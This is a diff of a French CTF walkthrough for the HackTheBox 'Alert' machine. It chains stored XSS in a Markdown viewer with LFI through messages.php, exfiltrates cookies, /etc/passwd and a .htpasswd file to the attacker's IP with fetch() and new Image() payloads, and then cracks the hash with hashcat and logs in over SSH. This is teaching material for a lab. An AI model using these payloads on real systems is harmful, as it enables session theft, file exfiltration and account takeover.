@@ -455,24 +455,40 @@ Port 80 (http)
 
 ## Prise pied
 
-Lorsque tu accèdes à `http://alert.htb`, tu arrives sur la page **“Markdown Viewer”**, qui est la première page affichée par l’application.
+Lorsque tu accèdes à `http://alert.htb`, tu arrives directement sur une interface nommée **“Markdown Viewer”**.
+
+Cette page constitue le point d’entrée principal de l’application et expose une fonctionnalité d’upload de fichiers, souvent critique en sécurité web.
 
 
 
 ![Interface Markdown Viewer avec upload de fichier Markdown et bouton Browse sur alert.htb](markdown-viewer.png)
 
-Sur cette page, un menu te permet de naviguer entre plusieurs pages :
- **Markdown Viewer**, **Contact us**, **About us** et **Donate**.
+L’interface propose plusieurs pages accessibles via un menu :
 
-La page **Markdown Viewer** attire particulièrement l’attention, car la présence d’un bouton **“Browse”** suggère un mécanisme d’upload de fichiers Markdown.
+- **Markdown Viewer**
+- **Contact us**
+- **About us**
+- **Donate**
 
-C’est cette fonctionnalité d’upload de fichiers `.md` que tu vas explorer dans la suite de l’analyse.
+Parmi celles-ci, **Markdown Viewer** se démarque immédiatement.  
+
+La présence d’un bouton **“Browse”** indique que tu peux uploader des fichiers Markdown (`.md`).
+
+Dans un contexte CTF, une fonctionnalité d’upload est toujours un point d’attention prioritaire. 
+
+Tu vas donc te concentrer sur ce mécanisme pour comprendre comment les fichiers sont traités.
 
 ### Test du rendu Markdown
 
-Pour commencer, tu peux créer un premier fichier Markdown simple afin de comprendre comment le contenu est traité par l’application.
+Avant de chercher une vulnérabilité, tu dois comprendre comment l’application traite les fichiers.
 
-Par exemple, crée un fichier `test.md` avec le contenu suivant :
+#### Objectif
+
+Vérifier si le contenu Markdown est correctement interprété.
+
+#### Action
+
+Crée un fichier `test.md` avec le contenu suivant :
 
 ```markdown
 # Test Markdown
@@ -480,7 +496,7 @@ Par exemple, crée un fichier `test.md` avec le contenu suivant :
 Ceci est un test.Ensuite :
 ```
 
-Ensuite :
+Puis :
 
 1. Clique sur le bouton **“Browse”**
 2. Sélectionne ton fichier `test.md`
@@ -494,18 +510,30 @@ Le contenu est alors affiché dans l’interface.
 
 > **Note :** un bouton **“Share Markdown”** est également présent sur la page et pourrait permettre de générer un lien de partage du contenu. Cette fonctionnalité sera analysée plus loin.
 
-Ce premier test te permet de valider que :
+#### Interprétation
 
-- les fichiers `.md` sont bien acceptés
-- le contenu est interprété et rendu dans le navigateur
+Tu confirmes que :
 
-À ce stade, tu contrôles donc directement le contenu affiché dans la page.
+- les fichiers `.md` sont acceptés
+- le contenu est rendu côté navigateur
+
+Tu contrôles donc directement ce qui est affiché dans la page.
+
+La question suivante est maintenant essentielle :
+
+**ce contenu est-il correctement filtré ?**
+
+Si ce n’est pas le cas, cela peut conduire à une vulnérabilité de type **XSS (Cross-Site Scripting)**, permettant l’exécution de JavaScript dans le navigateur.
 
 ### Injection XSS dans le Markdown
 
-Maintenant que tu contrôles le contenu affiché via le fichier `.md`, l’étape suivante consiste à tester si ce contenu est correctement filtré.
+#### Objectif
 
-Pour cela, tu peux modifier ton fichier `test.md` en y ajoutant un script simple :
+Tester si le contenu Markdown est filtré ou s’il permet l’exécution de JavaScript.
+
+#### Action
+
+Modifie ton fichier `test.md` :
 
 ```markdown
 # Test XSS
@@ -513,54 +541,53 @@ Pour cela, tu peux modifier ton fichier `test.md` en y ajoutant un script simple
 <script>alert(1)</script>
 ```
 
-Ensuite, répète les mêmes étapes :
+Puis recharge-le via **“View Markdown”**.
 
-1. Clique sur **“Browse”**
-2. Sélectionne ton fichier `test.md`
-3. Clique sur **“View Markdown”**
+#### Résultat
 
-
-#### Observation du comportement
-
-Lors de l’affichage du message, une alerte JavaScript apparaît.
+Une alerte JavaScript s’affiche.
 
 ![Alerte JavaScript déclenchée par une faille XSS dans Markdown Viewer sur alert.htb](xss-alert.png)
 
-Cela signifie que le code JavaScript est exécuté directement dans ton navigateur.
+#### Interprétation
 
-#### Analyse
+Cela signifie que :
 
-Ce comportement indique clairement que :
+- le contenu n’est **pas filtré**
+- les balises `<script>` sont exécutées
+- tu peux injecter du JavaScript
 
-- le contenu Markdown n’est **pas correctement filtré**
-- les balises `<script>` sont **interprétées par le navigateur**
-- il est possible d’injecter et d’exécuter du JavaScript
+Tu es face à une **faille XSS (Cross-Site Scripting)**.
 
-Tu es donc face à une **faille XSS (Cross-Site Scripting)**, une vulnérabilité qui permet d’injecter et d’exécuter du code JavaScript dans le navigateur d’un utilisateur.
-
-Dans ce cas, il s’agit très probablement d’une **XSS stockée (Stored XSS)**, c’est-à-dire que le code malveillant est enregistré par l’application et exécuté à chaque affichage.
+Dans ce contexte, il s’agit très probablement d’une **XSS stockée**, car le contenu peut être enregistré et rejoué.
 
 #### Impact
 
 À ce stade, tu peux :
 
-- exécuter du JavaScript dans ton propre navigateur
-- modifier dynamiquement le contenu de la page
+- exécuter du JavaScript dans ton navigateur
+- modifier le contenu de la page
 - interagir avec l’application côté client
 
-Mais surtout, si ce contenu est consulté par un autre utilisateur, le script s’exécutera dans **son navigateur, avec ses droits**.
+Mais surtout :
 
-Si tu parviens à faire lire ce contenu par un **administrateur**, tu pourras alors exécuter du code dans **son navigateur**, comme si tu étais **administrateur de l’application**, avec les mêmes droits et possibilités.
+si un autre utilisateur consulte ce contenu, le script s’exécutera dans **son navigateur avec ses droits**.
+
+L’objectif devient donc clair :
+
+faire exécuter ce code par un utilisateur plus privilégié, typiquement un administrateur.
+
+---
 
 ### Test d’exfiltration via XSS
 
-Maintenant que tu sais que tu peux exécuter du JavaScript dans ton navigateur, tu peux tester s’il est possible d’extraire des informations depuis la page.
+Maintenant que tu peux exécuter du JavaScript dans le navigateur, l’étape suivante consiste à vérifier si tu peux **exfiltrer des données**.
 
-Une première idée consiste à récupérer les cookies de session, car ils sont utilisés par l’application pour reconnaître un utilisateur déjà connecté. Les récupérer peut donc permettre d’usurper son identité.
+L’objectif classique est de récupérer les **cookies de session**, car ils permettent d’identifier un utilisateur connecté.
 
-#### Création du fichier .md pour récupérer les cookies
+#### Objectif
 
-Pour cela, tu peux modifier ton fichier `test.md` avec le contenu suivant :
+Vérifier si tu peux envoyer des données depuis le navigateur vers ta machine.
 
 ```markdown
 # Alert Test
@@ -572,64 +599,52 @@ new Image().src="http://10.10.16.93:8000/?c="+document.cookie;
 </script>
 ```
 
-La ligne `new Image().src="http://10.10.x.x:8000/?c="+document.cookie;` demande au navigateur de contacter ta machine Kali en utilisant l’adresse IP `10.10.x.x` de ton interface `tun0`.
+Cette ligne force le navigateur à effectuer une requête HTTP vers ta machine, en y ajoutant les cookies.
 
-Les cookies récupérés sont ceux du site que tu es en train de consulter, ici la page du **Markdown Viewer (`visualizer.php`) sur `alert.htb`**.
+#### Mise en place du listener
 
-Pour vérifier concrètement ce comportement, tu peux lancer un serveur sur ta machine Kali afin de visualiser les requêtes envoyées par le navigateur.
-
-#### Récupération sur la machine Kali
-
-Pour vérifier que les cookies sont bien envoyés vers ta machine, tu peux mettre en place un listener sur Kali.
-
-Pour cela, lance un serveur HTTP simple sur le port 8000 :
+Sur ta machine Kali, lance un serveur HTTP :
 
 ```bash
 python3 -m http.server 8000
 ```
 
-Ce serveur va écouter les connexions entrantes sur ton interface `tun0`.
+#### Résultat
 
-Recharge ensuite ton fichier Markdown dans l’application.
-
-Dans le terminal où le serveur est lancé, tu observes une requête entrante :
+Après avoir affiché le Markdown, tu observes une requête :
 
 ```bash
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.x.x - - [27/Mar/2026 10:44:40] "GET /?c= HTTP/1.1" 200 -
 ```
 
-La requête est bien reçue par ton serveur, ce qui confirme que le script est exécuté et que le navigateur contacte ta machine.
+#### Interprétation
 
-On remarque également que l’adresse IP affichée (`10.10.x.x`) correspond à ta propre machine (interface `tun0`).
+- Le script est bien exécuté
+- Le navigateur envoie une requête vers ta machine
+- Mais aucun cookie n’est récupéré
 
-Cela prouve que c’est bien **ton navigateur** qui exécute le script et envoie la requête vers ton serveur.
+C’est normal ici, car tu es dans ton propre contexte (non authentifié).
 
-Cependant, la valeur du paramètre `c` est vide : aucun cookie n’est envoyé dans ce cas.
-
-Cela s’explique par le fait que tu es actuellement dans un contexte non authentifié ou sans cookie exploitable.
-
-Le mécanisme fonctionne donc correctement, mais il faudra exécuter ce code dans un contexte plus intéressant, par exemple celui d’un administrateur, pour récupérer des informations utiles.
-
-------
+---
 
 ### Passage au contexte administrateur
 
-Pour exploiter pleinement la faille XSS, l’objectif est maintenant de faire exécuter ton code dans le navigateur d’un utilisateur ayant plus de privilèges, comme un administrateur.
+Pour exploiter pleinement la XSS, tu dois viser un utilisateur ayant plus de droits.
 
-Sur la page **About us**, on trouve l’information suivante :
+### Observation
+
+Sur la page **About us**, une information importante apparaît :
 
 ![Page About us indiquant que l’administrateur consulte les messages de contact sur alert.htb](about-us.png)
 
-Cette mention indique que **l’administrateur est en charge de lire les messages envoyés via le formulaire de contact**.
+L’administrateur lit les messages envoyés via le formulaire de contact.
 
-Cela signifie que si tu parviens à lui faire consulter ton contenu Markdown, ton code JavaScript sera exécuté dans **son navigateur**.
+Tu passes ici d’une XSS locale à une XSS exploitée dans un contexte administrateur, ce qui change complètement l’impact de la vulnérabilité.
 
 #### Génération du lien de partage
 
 Sur la page **Markdown Viewer**, après avoir uploadé ton fichier, un bouton **“Share Markdown”** permet de générer un lien de partage.
-
-![Lien Share Markdown généré pour un fichier md contenant une XSS sur alert.htb](share-md.png)
 
 Tu obtiens alors une URL de ce type :
 
@@ -637,15 +652,19 @@ Tu obtiens alors une URL de ce type :
 http://alert.htb/visualizer.php?link_share=69c656ef2cd5a2.66364523.md
 ```
 
+
+
+![Lien Share Markdown généré pour un fichier md contenant une XSS sur alert.htb](share-md.png)
+
 Ce lien permet d’accéder directement au contenu que tu as injecté.
 
 #### Envoi du lien via le formulaire de contact
 
-Tu peux maintenant utiliser la page **Contact us** pour envoyer ce lien à l’administrateur.
+Rends-toi sur **Contact us** et envoie ce lien.
 
 ![Formulaire Contact us sur alert.htb avec lien Share Markdown contenant une XSS prêt à être envoyé à l’administrateur](contact-us.png)
 
-Après envoi du message, l’application confirme :
+Après envoi :
 
 ```text
 Message sent successfully!
@@ -653,64 +672,72 @@ Message sent successfully!
 
 #### Exécution côté administrateur
 
-Quelques instants plus tard, une nouvelle requête apparaît dans ton listener :
+Quelques instants plus tard, unerequête apparaît dans ton listener :
 
 ```bash
 10.129.x.x - - [date] "GET /?c= HTTP/1.1" 200 -
 ```
 
-Contrairement au test précédent, **l’adresse IP n’est plus la tienne, mais celle de la cible.**
+#### Interprétation
+
+Cette fois :
+
+- l’adresse IP est celle de la cible
+- ce n’est plus ton navigateur
+- c’est celui de l’administrateur
 
 Cela signifie que :
 
-- le lien a été consulté par l’administrateur
-- le fichier Markdown a été affiché dans **son navigateur**
-- le code JavaScript s’est exécuté côté administrateur
-- la requête a été envoyée depuis sa machine vers la tienne
+- il a ouvert ton lien
+- ton Markdown a été affiché
+- ton JavaScript s’est exécuté dans son navigateur
+- la requête a été envoyée depuis sa machine
 
-Tu es donc parvenu à faire exécuter ton code dans le navigateur de l’administrateur, ce qui confirme l’exploitation d’une **XSS stockée dans un contexte privilégié**.
+Tu contrôles maintenant l’exécution de JavaScript dans un contexte administrateur.
 
-
-
-------
+---
 
 ### Exfiltration de contenu avec JavaScript
 
-Concrètement, l’idée est d’utiliser le navigateur de l’administrateur pour afficher des pages auxquelles toi tu n’as pas accès.
+Maintenant que ton code s’exécute côté administrateur, tu peux aller plus loin.
 
-Puisque ton code JavaScript s’exécute dans son navigateur, tu peux lui faire ouvrir ces pages à ta place. Le contenu s’affiche alors dans son navigateur, avec ses droits.
+L’idée est simple :
 
-Ton code peut ensuite lire ce contenu, puis l’envoyer vers ta machine.
+1. faire charger une page interne dans son navigateur
+2. récupérer le contenu
+3. l’envoyer vers ta machine
 
-L’objectif est donc de trouver une page intéressante à cibler afin de faire apparaître des fichiers sensibles dans le navigateur de l’administrateur.
+#### Recherche d’une cible intéressante
 
-#### Recherche d’une page intéressante à exploiter
+Tu dois maintenant identifier une page qui affiche du contenu utile.
 
-Pour avancer, tu dois maintenant identifier une page de l’application qui pourrait afficher des fichiers ou du contenu intéressant.
+Lors de l’énumération, une page attire l’attention :
 
-Lors de la phase d’énumération, tu as découvert plusieurs pages.
+messages.php
 
-L’objectif est ici de repérer une fonctionnalité qui affiche du contenu dynamique, en particulier des fichiers, car ce type de fonctionnalité peut permettre d’accéder à des informations sensibles.
 
-Parmi les pages identifiées, `messages.php` attire l’attention, car son nom suggère qu’elle pourrait afficher du contenu stocké côté serveur.
 
-#### Utilisation de `fetch()` pour lire une page
+#### Pourquoi messages.php ?
 
-Tu dois maintenant trouver comment faire afficher un fichier dans le navigateur de l’administrateur, puis en récupérer le contenu.
+- son nom suggère un affichage de messages
+- elle pourrait manipuler des fichiers
+- elle n’est pas accessible directement
 
-Pour cela, tu peux utiliser `fetch()`. En JavaScript, `fetch()` permet d’envoyer une requête HTTP vers une URL et de récupérer la réponse renvoyée par le serveur. Tu peux le voir comme un `curl` exécuté directement depuis le navigateur.
+**Cela en fait une cible idéale pour tenter une exploitation de type Local File Inclusion (LFI).**
 
-Dans ton cas, l’idée est la suivante :
+#### Utilisation de `fetch()`
 
-1. faire ouvrir une page de l’application dans le navigateur de l’administrateur ;
-2. récupérer ce que cette page affiche ;
-3. envoyer ces informations vers ta machine Kali.
+Pour lire une page via le navigateur de l’administrateur, tu peux utiliser `fetch()`.
 
-#### Premiers essais avec `fetch()`
+C’est l’équivalent d’un curl exécuté dans son navigateur.
 
-Une première étape consiste à vérifier que tu peux appeler la page `messages.php` depuis le navigateur de l’administrateur, puis récupérer le contenu qu’elle renvoie.
+#### Objectif
 
-Pour cela, crée un fichier `fetch-test.md` avec le contenu suivant :
+Lire le contenu de `messages.php`.
+
+#### Action
+
+Crée un fichier `fetch-test.md` :
 
 ```markdown
 # Message test
@@ -724,25 +751,23 @@ fetch('http://alert.htb/messages.php')
 </script>
 ```
 
-Ce code fonctionne en plusieurs étapes :
+#### Résultat
 
-- `fetch()` appelle la page `messages.php`
-- `.then(r => r.text())` récupère le contenu renvoyé par le serveur
-- `new Image().src` envoie ce contenu vers ta machine Kali
-
-Tu peux ensuite uploader ce fichier, générer un lien avec **“Share Markdown”**, puis l’envoyer via la page **Contact us**.
-
-Dans ton terminal Kali, tu observes alors une requête entrante contenant le résultat renvoyé par la page :
+Tu reçois une requête contenant du Base64 :
 
 ```bash
 10.129.231.188 - - [27/Mar/2026 17:07:00] "GET /?d=PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg== HTTP/1.1" 200 -
 ```
+
+#### Décodage
 
 Le contenu est encodé en Base64. Tu peux le décoder avec la commande suivante :
 
 ```bash
 echo "PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg==" | base64 -d
 ```
+
+#### Contenu obtenu
 
 Tu obtiens alors le contenu HTML suivant :
 
@@ -757,21 +782,27 @@ Tu obtiens alors le contenu HTML suivant :
 </ul>
 ```
 
-Ce résultat montre que la page `messages.php` affiche une liste de fichiers disponibles, avec des liens utilisant le paramètre `file`.
+#### Interprétation (POINT CLÉ)
 
-Ces informations ne sont pas visibles pour un utilisateur standard, mais deviennent accessibles lorsqu’elles sont récupérées depuis le navigateur de l’administrateur.
+👉 Tu viens de découvrir quelque chose d’essentiel :
 
-On dispose désormais d’un point d’entrée clair pour lire des fichiers via :
+- la page liste des fichiers
+- elle utilise un paramètre `file`
+- elle permet d’afficher du contenu
+
+C’est un point d’entrée potentiel pour une **LFI**
 
 ```bash
 messages.php?file=...
 ```
 
-#### Confirmation de la lecture d’un fichier
+### Confirmation de la lecture d’un fichier
 
-Maintenant que tu sais que la page `messages.php` permet d’afficher des fichiers via le paramètre `file`, tu peux vérifier s’il est possible de lire un fichier système.
+Maintenant, tu vas tester si tu peux lire un fichier système.
 
-Pour cela, crée un fichier `fetch-files.md` avec le contenu suivant :
+#### Action
+
+Crée `fetch-files.md` :
 
 
 ```markdown
@@ -786,15 +817,15 @@ fetch('http://alert.htb/messages.php?file=../../../../etc/passwd')
 </script>
 ```
 
-Ici, le code demande au navigateur de l’administrateur d’ouvrir le fichier `/etc/passwd` via `messages.php`, puis d’envoyer son contenu vers ta machine Kali.
+#### Résultat
 
-Lorsque ce fichier Markdown est consulté, une requête est envoyée vers ton serveur :
+Tu reçois du contenu encodé.
 
 ```bash
 10.129.xxx.xxx - - [date] "GET /?d=PHByZT5yb290Ong6MDow...
 ```
 
-Le contenu est encodé en Base64 afin de pouvoir être transmis dans l’URL. Après décodage, tu obtiens :
+Après décodage :
 
 ```bash
 <pre>root:x:0:0:root:/root:/bin/bash
@@ -805,66 +836,108 @@ david:x:1001:1002:,,,:/home/david:/bin/bash
 </pre>
 ```
 
-Ce test confirme que :
+#### Interprétation
 
-- le paramètre `file` permet de lire des fichiers arbitraires sur le serveur
-- cette lecture est effectuée dans le navigateur de l’administrateur, donc avec ses droits
-- le contenu peut être exfiltré vers ta machine
+- tu peux lire des fichiers locaux
+- l’accès se fait via le navigateur admin
+- le contenu est exfiltré
 
-Tu es donc en présence d’une vulnérabilité de type **Local File Inclusion (LFI)** exploitable via la XSS.
+**Tu confirmes une vulnérabilité de type Local File Inclusion (LFI), exploitable grâce à la XSS.**
 
-------
+---
 
-### Découverte d’un point d’entrée LFI
+### Découverte d’un point d’entrée exploitable
 
-À ce stade, grâce à la XSS et à notre mécanisme d’exfiltration (`fetch()` + `new Image()`), nous avons validé que nous pouvions lire des fichiers locaux sur le serveur via le paramètre `file` de `messages.php`.
+À ce stade, tu peux lire des fichiers locaux sur le serveur via la LFI.
 
-Après un premier test sur `/etc/passwd`, dont le rendu reste inexploitable (`<pre><pre>`), nous orientons notre analyse vers des fichiers de configuration plus pertinents.
+**Après avoir confirmé la LFI, tu peux maintenant cibler des fichiers sensibles du système, notamment des fichiers de configuration.**
 
-Nous ciblons alors la configuration Apache avec `/etc/apache2/apache2.conf`, qui révèle l’utilisation de fichiers inclus :
+#### Objectif
+
+Identifier des fichiers contenant :
+
+- des chemins sensibles
+- des informations d’authentification
+- des éléments exploitables pour la suite
+
+---
+
+### Exploration de la configuration Apache
+
+Un bon réflexe consiste à analyser la configuration du serveur web.
+
+
+
+#### Action
+
+Tu récupères le fichier :
+
+/etc/apache2/apache2.conf
+
+
+
+#### Résultat
+
+Tu identifies la directive suivante :
+
+IncludeOptional sites-enabled/*.conf
+
+
+
+#### Interprétation
+
+Cette ligne indique que la configuration des virtual hosts est chargée depuis :
 
 ```bash
 # Include the virtual host configurations:
 IncludeOptional sites-enabled/*.conf
 ```
 
+Tu sais maintenant où chercher des informations intéressantes.
 
+### Analyse des VirtualHosts
 
-Cette directive nous indique où poursuivre notre exploration.
+#### Action
 
-En accédant à `/etc/apache2/sites-enabled/000-default.conf`, nous obtenons la configuration des VirtualHosts, dont un élément particulièrement intéressant :
+Tu lis le fichier :
+
+```bash
+/etc/apache2/sites-enabled/000-default.conf
+```
+
+---
+
+#### Résultat
+
+Tu identifies une directive importante :
 
 ```bash
 AuthUserFile /var/www/statistics.alert.htb/.htpasswd
 ```
 
-Cette information indique l’existence d’un fichier `.htpasswd` contenant des identifiants protégés, accessible localement sur le serveur.
+#### Interprétation (POINT CLÉ)
 
-Nous disposons donc maintenant d’une cible concrète à exploiter via notre lecture de fichiers.
+Cette ligne indique :
+
+- l’utilisation d’une authentification HTTP Basic
+- la présence d’un fichier `.htpasswd`
+- un chemin local accessible via ta LFI
+
+**Ce type de fichier est particulièrement intéressant en CTF, car il contient souvent des identifiants directement exploitables.**
 
 ### Lecture du fichier `.htpasswd`
 
-En exploitant notre capacité de lecture de fichiers, nous ciblons directement le fichier identifié précédemment :
+#### Action
 
-```bash
+Tu adaptes ton payload pour lire le fichier :
+
 /var/www/statistics.alert.htb/.htpasswd
-```
 
-Nous adaptons notre payload afin d’exfiltrer son contenu :
 
-```markdown
-# Fetch LFI .htpasswd
 
-<script>
-fetch('http://alert.htb/messages.php?file=../../../../../var/www/statistics.alert.htb/.htpasswd')
-  .then(r => r.text())
-  .then(data => {
-    new Image().src = 'http://10.10.16.93:8000/?d=' + btoa(data);
-  });
-</script>
-```
+#### Résultat
 
-Après décodage de la réponse reçue, nous obtenons :
+Après exfiltration et décodage :
 
 ```bash
 albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
@@ -881,53 +954,57 @@ Nous allons maintenant tenter de casser ce hash afin d’obtenir les identifiant
 
 ### Cracking du hash `.htpasswd`
 
-LLe contenu du fichier `.htpasswd` nous fournit le hash suivant :
+#### Objectif
 
-```bash
-albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
-```
+Retrouver le mot de passe en clair.
 
-Le préfixe `$apr1$` indique un hash Apache MD5, typiquement utilisé pour l’authentification HTTP Basic via `.htpasswd`.
 
-Nous le plaçons dans un fichier `hash.txt`, puis nous utilisons `hashcat` avec le mode correspondant et la wordlist `rockyou.txt` :
+
+#### Action
+
+Tu places le hash dans un fichier :
 
 ```bash
 echo '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' > hash.txt
 ```
 
+Puis tu utilises `hashcat` :
+
 ```bash
 hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-Le mot de passe est retrouvé très rapidement :
 
-```bash
-$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited
-```
 
-Nous obtenons donc les identifiants suivants :
+#### Résultat
 
-```text
-albert:manchesterunited
-```
+Le mot de passe est retrouvé :
 
-Ces identifiants vont ensuite être testés sur les services accessibles, en commençant logiquement par la zone protégée du vhost `statistics.alert.htb`.
+`manchesterunited`
+
+
+
+#### Interprétation
+
+Tu obtiens les identifiants complets :
+
+**albert:manchesterunited**
+
+---
 
 ### Test des identifiants
 
-On a récupéré les identifiants suivants :
+Ces identifiants proviennent d’un `.htpasswd`, donc initialement destinés à une authentification web.
 
-```bash
-albert:manchesterunited
-```
+**En pratique, il est toujours recommandé de tester ces identifiants sur tous les services accessibles, notamment SSH.**
 
-Ces identifiants proviennent d’un fichier `.htpasswd`, donc initialement destinés à une authentification web. Cependant, en CTF, **il est fréquent que les identifiants soient réutilisés sur plusieurs services**.
-
-On teste donc leur réutilisation sur le service SSH :
+Tu testes en SSH :
 
 ```bash
 ssh albert@alert.htb
 ```
+
+#### Résultat
 
 L’authentification fonctionne.
 
@@ -942,27 +1019,40 @@ id
 uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
 ```
 
-> L’appartenance  au groupe `management` pourrait éventuellement être intéressant pour la suite dans l’escalade de privilèges.
+#### Interprétation
 
-On liste ensuite le répertoire personnel :
+L’utilisateur appartient au groupe `management`, ce qui pourrait être utile pour la suite.
+
+#### Récupération du flag
 
 ```bash
 ls -l
 -rw-r----- 1 root albert 33 Mar 29 13:19 user.txt
 ```
 
-Le fichier `user.txt` est lisible par l’utilisateur `albert`, ce qui nous permet de récupérer le flag :
+
 
 ```bash
 cat user.txt
 7e4dxxxxxxxxxxxxxxxxxxxxxxxxxxx31fb
 ```
 
+---
+
 ### Conclusion de la prise pied
 
-Tu as obtenu un accès SSH valide en tant qu’utilisateur `albert` grâce à la réutilisation des identifiants récupérés via la LFI.
+Tu as obtenu un accès SSH valide en exploitant une chaîne complète de vulnérabilités web, allant d’un upload de fichier à une XSS stockée, puis à une LFI, jusqu’à la récupération et réutilisation de credentials :
 
-Cela te permet de récupérer le flag utilisateur et confirme la réussite de la prise pied sur la machine cible.
+- upload de fichier Markdown
+- XSS stockée
+- exécution dans le navigateur administrateur
+- exfiltration via JavaScript
+- LFI via `messages.php`
+- récupération d’un fichier `.htpasswd`
+- cracking du hash
+- réutilisation des identifiants
+
+Cette chaîne d’exploitation te permet de récupérer le flag utilisateur et confirme la réussite de la prise pied sur la machine.
 
 Tu peux maintenant passer à la phase d’énumération locale en vue d’une élévation de privilèges.
 
